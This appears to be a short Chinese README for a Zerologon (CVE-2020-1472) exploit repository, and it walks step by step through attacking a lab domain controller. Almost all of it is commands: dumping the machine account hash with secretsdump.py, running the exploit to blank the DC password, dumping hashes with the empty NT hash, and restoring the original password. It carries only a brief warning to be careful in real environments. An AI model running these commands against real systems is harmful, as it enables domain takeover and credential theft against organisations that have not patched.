复现完了有点小BUG，重启后无法进入桌面。不知道是不是只有我会。(谨慎在真实环境利用)

第一步

pip3 install -r requirements.txt

查看hash

secretsdump.py molecule-labs.com/administrator:Aa123456.@192.168.175.132 -just-dc-user 'AD$'
![](https://github.com/NAXG/CVE-2020-1472/blob/master/1.png)

攻击

python3 CVE-2020-1472.py AD AD$ 192.168.175.132
![](https://github.com/NAXG/CVE-2020-1472/blob/master/2.png)

查询域控hash

secretsdump.py molecule-labs.com/'AD$'@192.168.175.132 -just-dc-user 'AD$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
![](https://github.com/NAXG/CVE-2020-1472/blob/master/3.png)

恢复hash

python3 reinstall_original_pw.py AD 192.168.175.132 061e8e521872fa93a2f8d89ca0683145
![](https://github.com/NAXG/CVE-2020-1472/blob/master/4.png)

查询恢复后的hash

secretsdump.py molecule-labs.com/administrator:Aa123456.@192.168.175.132 -just-dc-user 'AD$'
![](https://github.com/NAXG/CVE-2020-1472/blob/master/5.png)
